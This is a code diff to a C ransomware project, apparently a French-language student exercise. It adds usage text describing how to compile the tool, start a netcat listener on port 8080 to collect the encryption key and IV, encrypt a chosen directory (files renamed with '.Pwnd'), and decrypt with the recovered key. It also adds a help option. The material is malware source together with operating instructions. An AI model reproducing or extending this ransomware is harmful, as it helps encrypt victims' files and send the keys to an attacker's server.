@@ -12,6 +12,22 @@ void usage()
 	printf("--------------------------------------\n");
 	printf("Bienvenue sur le projet de Ransomware\n");
 	printf("--------------------------------------\n");
+	printf("Procédure à suivre pour lancé le code:\n");
+	printf("\n");
+	printf("[1] -- Se mettre dans le dossier dans lequel le code s'y trouve\n");
+	printf("[2] -- Taper la commande < gcc -o ransom ransom.c ransomlib.c -lcrypto > 	\n");
+	printf("[3] -- Lancer le server dans un autre terminal avec la commande < nc -l -v -p 8080 >	\n");
+	printf("[4] -- Revenez dans votre premier terminal pour lancer l'encryption \n");
+	printf("[5] -- La commande est celle ci : < ./ransom (chemin du repertoire à encrypter) -enc >	\n");
+	printf("[6] -- Récuperer la clé et l'iv sur le server\n");
+	printf("[7] -- Décrypter : <./ransom (chemin du répertoire à décrypter) -dec (clé) (iv)>	\n");
+	printf("--------------------------------------\n");
+
+	printf("[-enc] --> encryption	\n");
+	printf("[-dec] --> decryption	\n");
+	printf("[-help] --> aide	\n");
+
+	
 };
 
 int is_encrypted(char *filename) //Ici on assume que le nom de nos fichiers cryptés seront en ".Pwnd"
@@ -161,10 +177,9 @@ int main (int argc, char * argv[])
 		}
 	}
 	
-	else
+	if(strcmp(argv[1], "-help")==0 & argc==2)
 	{
 		usage();
-		printf("./ransom PATH \n");
 	}
 }
 
